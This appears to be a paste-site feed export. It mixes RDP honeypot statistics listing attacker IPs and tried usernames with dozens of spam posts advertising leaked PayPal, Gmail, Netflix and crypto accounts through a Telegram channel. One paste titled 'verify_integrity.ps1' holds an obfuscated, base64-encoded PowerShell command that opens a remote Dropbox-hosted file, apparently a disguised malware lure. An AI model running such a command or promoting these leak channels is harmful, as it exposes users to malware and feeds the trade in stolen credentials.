id,title,username,language,date,content
FMyF35uX,2025-06-26_stats.json,rdp_snitch,JSON,Thursday 26th of June 2025 07:16:09 PM CDT,"{
  ""ip"": {
    ""14.225.202.191"": 7850,
    ""24.173.30.170"": 14312,
    ""2.57.121.247"": 10,
    ""147.185.132.132"": 6,
    ""23.148.144.149"": 2,
    ""193.142.146.227"": 10,
    ""92.63.197.23"": 22,
    ""203.176.135.5"": 4,
    ""205.210.31.213"": 6,
    ""102.88.21.215"": 2,
    ""162.142.125.209"": 2,
    ""45.227.254.132"": 6,
    ""91.238.181.91"": 4,
    ""138.68.188.52"": 2,
    ""111.170.152.113"": 6,
    ""185.196.220.41"": 6,
    ""45.227.253.52"": 8,
    ""188.166.234.227"": 4,
    ""88.214.25.124"": 4,
    ""205.210.31.134"": 6,
    ""193.24.211.25"": 4,
    ""146.190.167.180"": 6,
    ""45.227.253.51"": 2,
    ""159.89.192.184"": 6,
    ""139.59.117.151"": 4,
    ""162.210.245.77"": 8,
    ""152.32.235.90"": 2,
    ""170.64.130.115"": 12,
    ""198.235.24.51"": 6
  },
  ""asn"": {
    ""AS135905"": 7850,
    ""AS11427"": 14312,
    ""AS47890"": 10,
    ""AS396982"": 24,
    ""AS46664"": 2,
    ""AS213438"": 16,
    ""AS210848"": 22,
    ""AS38235"": 4,
    ""AS29465"": 2,
    ""AS398324"": 2,
    ""AS267784"": 6,
    ""AS49434"": 4,
    ""AS14061"": 34,
    ""AS151185"": 6,
    ""AS209272"": 10,
    ""AS35042"": 4,
    ""AS215929"": 4,
    ""AS397651"": 8,
    ""AS135377"": 2
  },
  ""isp"": {
    ""Vietnam Posts and Telecommunications Group"": 7850,
    ""Charter Communications Inc"": 14312,
    ""Unmanaged LTD"": 10,
    ""Google LLC"": 24,
    ""VolumeDrive"": 2,
    ""ColocaTel Inc."": 16,
    ""Telkom Internet LTD"": 22,
    ""Angkor Data Communication"": 4,
    ""MTN NIGERIA Communication limited"": 2,
    ""Censys, Inc."": 2,
    ""Flyservers S.A."": 6,
    ""Datacenter location PAR1 France"": 4,
    ""DigitalOcean, LLC"": 30,
    ""China Telecom"": 6,
    ""Flyservers S.A"": 10,
    ""NOC EMAIL: noc@one-host.net"": 4,
    ""Data Campus Limited"": 4,
    ""DIGITALOCEAN"": 4,
    ""RCI Broadband"": 8,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2
  },
  ""org"": {
    ""VNPT"": 7850,
    ""Spectrum"": 14312,
    ""Unmanaged LTD"": 10,
    ""Palo Alto Networks, Inc"": 24,
    ""Quick Server Hosting LLC"": 2,
    ""ColocaTel Inc"": 10,
    ""Korotkij Denis Aleksandrovich"": 22,
    ""Mekongnet"": 4,
    ""MTN Nigeria"": 2,
    ""Censys Inc"": 2,
    ""Xwin Universal LTD"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 8,
    ""DigitalOcean, LLC"": 30,
    ""Chinanet HB"": 6,
    ""Colocatel Inc"": 6,
    ""Nextcloud S.A"": 10,
    ""Digitalocean"": 4,
    ""Data Campus Limited"": 4,
    ""10x Servers"": 8,
    ""Ucloud Information Technology"": 2
  },
  ""regionName"": {
    ""Hanoi"": 7850,
    ""Texas"": 14312,
    ""England"": 12,
    ""California"": 32,
    ""Pennsylvania"": 2,
    ""North Holland"": 32,
    ""Phnom Penh"": 4,
    ""Lagos"": 2,
    ""Michigan"": 2,
    ""Vilnius"": 6,
    ""\u00cele-de-France"": 4,
    ""Hubei"": 6,
    ""Virginia"": 14,
    ""La Paz Department"": 10,
    ""South West"": 14,
    ""Kowloon City"": 4,
    ""Central and Western District"": 4,
    ""New South Wales"": 12
  },
  ""country"": {
    ""Vietnam"": 7850,
    ""United States"": 14362,
    ""United Kingdom"": 12,
    ""The Netherlands"": 32,
    ""Cambodia"": 4,
    ""Nigeria"": 2,
    ""Lithuania"": 6,
    ""France"": 4,
    ""China"": 6,
    ""Bolivia"": 10,
    ""Singapore"": 14,
    ""Hong Kong"": 8,
    ""Australia"": 12
  },
  ""account"": {
    ""hello"": 22210,
    ""Administr"": 38,
    ""sziFFXkRz"": 2,
    ""tgIIEH"": 2,
    ""tXxsZC"": 2,
    ""Domain"": 22,
    ""LdWhMWjSq"": 2,
    ""Plwpzr"": 2,
    ""kjCQBo"": 2,
    ""(empty)"": 2,
    ""Test"": 24,
    ""yOtFIKxDa"": 2,
    ""uNCYnW"": 2,
    ""tUjObS"": 2,
    ""Administrator"": 2,
    ""UglEWDRwa"": 2,
    ""YGfbog"": 2,
    ""GYDDEn"": 2
  },
  ""keyboard"": {
    ""Unknown"": 22322
  },
  ""client_build"": {
    ""Unknown"": 22322
  },
  ""client_name"": {
    ""Unknown"": 22322
  },
  ""ip_type"": {
    ""Unknown"": 22246,
    ""hosting"": 66,
    ""mobile & hosting"": 2,
    ""proxy"": 8
  }
}"
Mj1AX2aY,✅ MAKE $1200 IN 15 MIN,Double_Y,JavaScript,Thursday 26th of June 2025 07:16:06 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 94812"
x9GYMZai,Make $1200 in 15 minutes,Double_Y,JavaScript,Thursday 26th of June 2025 07:15:34 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 85193"
4WfC904a,2025-06-26_stats.json,rdp_snitch,JSON,Thursday 26th of June 2025 07:15:11 PM CDT,"{
  ""ip"": {
    ""14.225.202.191"": 3925,
    ""24.173.30.170"": 7156,
    ""2.57.121.247"": 5,
    ""147.185.132.132"": 3,
    ""23.148.144.149"": 1,
    ""193.142.146.227"": 5,
    ""92.63.197.23"": 11,
    ""203.176.135.5"": 2,
    ""205.210.31.213"": 3,
    ""102.88.21.215"": 1,
    ""162.142.125.209"": 1,
    ""45.227.254.132"": 3,
    ""91.238.181.91"": 2,
    ""138.68.188.52"": 1,
    ""111.170.152.113"": 3,
    ""185.196.220.41"": 3,
    ""45.227.253.52"": 4,
    ""188.166.234.227"": 2,
    ""88.214.25.124"": 2,
    ""205.210.31.134"": 3,
    ""193.24.211.25"": 2,
    ""146.190.167.180"": 3,
    ""45.227.253.51"": 1,
    ""159.89.192.184"": 3,
    ""139.59.117.151"": 2,
    ""162.210.245.77"": 4,
    ""152.32.235.90"": 1,
    ""170.64.130.115"": 6,
    ""198.235.24.51"": 3
  },
  ""asn"": {
    ""AS135905"": 3925,
    ""AS11427"": 7156,
    ""AS47890"": 5,
    ""AS396982"": 12,
    ""AS46664"": 1,
    ""AS213438"": 8,
    ""AS210848"": 11,
    ""AS38235"": 2,
    ""AS29465"": 1,
    ""AS398324"": 1,
    ""AS267784"": 3,
    ""AS49434"": 2,
    ""AS14061"": 17,
    ""AS151185"": 3,
    ""AS209272"": 5,
    ""AS35042"": 2,
    ""AS215929"": 2,
    ""AS397651"": 4,
    ""AS135377"": 1
  },
  ""isp"": {
    ""Vietnam Posts and Telecommunications Group"": 3925,
    ""Charter Communications Inc"": 7156,
    ""Unmanaged LTD"": 5,
    ""Google LLC"": 12,
    ""VolumeDrive"": 1,
    ""ColocaTel Inc."": 8,
    ""Telkom Internet LTD"": 11,
    ""Angkor Data Communication"": 2,
    ""MTN NIGERIA Communication limited"": 1,
    ""Censys, Inc."": 1,
    ""Flyservers S.A."": 3,
    ""Datacenter location PAR1 France"": 2,
    ""DigitalOcean, LLC"": 15,
    ""China Telecom"": 3,
    ""Flyservers S.A"": 5,
    ""NOC EMAIL: noc@one-host.net"": 2,
    ""Data Campus Limited"": 2,
    ""DIGITALOCEAN"": 2,
    ""RCI Broadband"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1
  },
  ""org"": {
    ""VNPT"": 3925,
    ""Spectrum"": 7156,
    ""Unmanaged LTD"": 5,
    ""Palo Alto Networks, Inc"": 12,
    ""Quick Server Hosting LLC"": 1,
    ""ColocaTel Inc"": 5,
    ""Korotkij Denis Aleksandrovich"": 11,
    ""Mekongnet"": 2,
    ""MTN Nigeria"": 1,
    ""Censys Inc"": 1,
    ""Xwin Universal LTD"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""DigitalOcean, LLC"": 15,
    ""Chinanet HB"": 3,
    ""Colocatel Inc"": 3,
    ""Nextcloud S.A"": 5,
    ""Digitalocean"": 2,
    ""Data Campus Limited"": 2,
    ""10x Servers"": 4,
    ""Ucloud Information Technology"": 1
  },
  ""regionName"": {
    ""Hanoi"": 3925,
    ""Texas"": 7156,
    ""England"": 6,
    ""California"": 16,
    ""Pennsylvania"": 1,
    ""North Holland"": 16,
    ""Phnom Penh"": 2,
    ""Lagos"": 1,
    ""Michigan"": 1,
    ""Vilnius"": 3,
    ""\u00cele-de-France"": 2,
    ""Hubei"": 3,
    ""Virginia"": 7,
    ""La Paz Department"": 5,
    ""South West"": 7,
    ""Kowloon City"": 2,
    ""Central and Western District"": 2,
    ""New South Wales"": 6
  },
  ""country"": {
    ""Vietnam"": 3925,
    ""United States"": 7181,
    ""United Kingdom"": 6,
    ""The Netherlands"": 16,
    ""Cambodia"": 2,
    ""Nigeria"": 1,
    ""Lithuania"": 3,
    ""France"": 2,
    ""China"": 3,
    ""Bolivia"": 5,
    ""Singapore"": 7,
    ""Hong Kong"": 4,
    ""Australia"": 6
  },
  ""account"": {
    ""hello"": 11105,
    ""Administr"": 19,
    ""sziFFXkRz"": 1,
    ""tgIIEH"": 1,
    ""tXxsZC"": 1,
    ""Domain"": 11,
    ""LdWhMWjSq"": 1,
    ""Plwpzr"": 1,
    ""kjCQBo"": 1,
    ""(empty)"": 1,
    ""Test"": 12,
    ""yOtFIKxDa"": 1,
    ""uNCYnW"": 1,
    ""tUjObS"": 1,
    ""Administrator"": 1,
    ""UglEWDRwa"": 1,
    ""YGfbog"": 1,
    ""GYDDEn"": 1
  },
  ""keyboard"": {
    ""Unknown"": 11161
  },
  ""client_build"": {
    ""Unknown"": 11161
  },
  ""client_name"": {
    ""Unknown"": 11161
  },
  ""ip_type"": {
    ""Unknown"": 11123,
    ""hosting"": 33,
    ""mobile & hosting"": 1,
    ""proxy"": 4
  }
}"
86Ev8UwM,✅ Crypto Accounts,Double_Y,JavaScript,Thursday 26th of June 2025 07:15:02 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 37105"
D2Z6jVBB,✅ PayPal Hits,Double_Y,JavaScript,Thursday 26th of June 2025 07:14:30 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 33242"
KJDQSErE,✅ Account Leaks,Emma_Mn,JavaScript,Thursday 26th of June 2025 07:13:53 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 79465"
AYTryuUC,GMAIL Logs (2FA disabled),Emma_Mn,JavaScript,Thursday 26th of June 2025 07:13:21 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 10901"
CE38JShP,FREE BTC GUIDE,Emma_Mn,JavaScript,Thursday 26th of June 2025 07:12:49 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 20751"
qdeT2Q8J,MAKE $500 INSTANTLY,Emma_Mn,JavaScript,Thursday 26th of June 2025 07:12:18 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 00355"
x6nhqFJb,Netflix Premium UHD Hits,Emma_Mn,JavaScript,Thursday 26th of June 2025 07:11:44 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 79098"
dr9AdQih,✅ MAKE $1200 IN 15 MIN,Emma_Mn,JavaScript,Thursday 26th of June 2025 07:11:13 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 74093"
h8kgEN4R,Make $1200 in 15 minutes,Emma_Mn,JavaScript,Thursday 26th of June 2025 07:10:41 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 47061"
5fVcr3W0,✅ Crypto Accounts,Emma_Mn,JavaScript,Thursday 26th of June 2025 07:10:09 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 10350"
kCDDcx71,✅ PayPal Hits,Emma_Mn,JavaScript,Thursday 26th of June 2025 07:09:34 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 97897"
j7ivPkjC,✅ Account Leaks,rip_luck,JavaScript,Thursday 26th of June 2025 07:09:00 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 50442"
KP6txKfM,verify_integrity.ps1,Comeors,Batch,Thursday 26th of June 2025 07:08:50 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwB4AGwANAA0AGgAOQAzAHEAYwAzAHAAawAzAGoAZwAzAGIAaQAyAG8AMwAvAG4AZQB3AHQAdQB0AC4AcABkAGYAPwByAGwAawBlAHkAPQB2AHoANwB0ADIANgBpAGkAMwBtAGIAYgBvAGEANgB0AGwAMAAyAHEAZgB5AHUAOQBlACYAZQA9ADEAJgBzAHQAPQBkAGIAaQA2AGoAcQA2AGYAIgAgACAAIwAgAGkAZAA9ADgAZQBhADYAMAA4ADUAZgA=

w5Mt0c"
BgZgbG4Y,GMAIL Logs (2FA disabled),rip_luck,JavaScript,Thursday 26th of June 2025 07:08:28 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 60580"
gyH1xmTB,FREE BTC GUIDE,rip_luck,JavaScript,Thursday 26th of June 2025 07:07:56 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 01631"
zhxj76HQ,MAKE $500 INSTANTLY,rip_luck,JavaScript,Thursday 26th of June 2025 07:07:25 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 36295"
biSNtm5J,Netflix Premium UHD Hits,rip_luck,JavaScript,Thursday 26th of June 2025 07:06:49 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 20885"
atkkb4Wr,✅ MAKE $1200 IN 15 MIN,rip_luck,JavaScript,Thursday 26th of June 2025 07:06:08 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 33108"
gVE0dGD2,Make $1200 in 15 minutes,rip_luck,JavaScript,Thursday 26th of June 2025 07:05:37 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 21484"
4nStYVef,✅ Crypto Accounts,rip_luck,JavaScript,Thursday 26th of June 2025 07:05:05 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 31025"
diWXP3mE,✅ PayPal Hits,rip_luck,JavaScript,Thursday 26th of June 2025 07:04:33 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 67871"
SKvr0ThV,✅ Account Leaks,ihak4funlol12345,JavaScript,Thursday 26th of June 2025 07:04:00 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 60197"
yxdmuLma,GMAIL Logs (2FA disabled),ihak4funlol12345,JavaScript,Thursday 26th of June 2025 07:03:27 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 40957"
2E2TKp22,FREE BTC GUIDE,ihak4funlol12345,JavaScript,Thursday 26th of June 2025 07:02:55 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 76211"
RT06kTeB,MAKE $500 INSTANTLY,ihak4funlol12345,JavaScript,Thursday 26th of June 2025 07:02:11 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 81911"
1ftEYbAN,Netflix Premium UHD Hits,ihak4funlol12345,JavaScript,Thursday 26th of June 2025 07:01:40 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 81706"
ZzdrvddA,✅ MAKE $1200 IN 15 MIN,ihak4funlol12345,JavaScript,Thursday 26th of June 2025 07:01:07 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 80365"
khja5eFU,Make $1200 in 15 minutes,ihak4funlol12345,JavaScript,Thursday 26th of June 2025 07:00:35 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 84883"
RuAAJUd5,✅ Crypto Accounts,ihak4funlol12345,JavaScript,Thursday 26th of June 2025 07:00:04 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 21059"
xtA5BbFU,✅ PayPal Hits,ihak4funlol12345,JavaScript,Thursday 26th of June 2025 06:59:32 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 22515"
5cpvvzEg,✅ Account Leaks,takedonjts12,JavaScript,Thursday 26th of June 2025 06:58:58 PM CDT,"We just posted new leaks.

Join the channel: https://t.me/lucasleak2

Accounts: 30741"
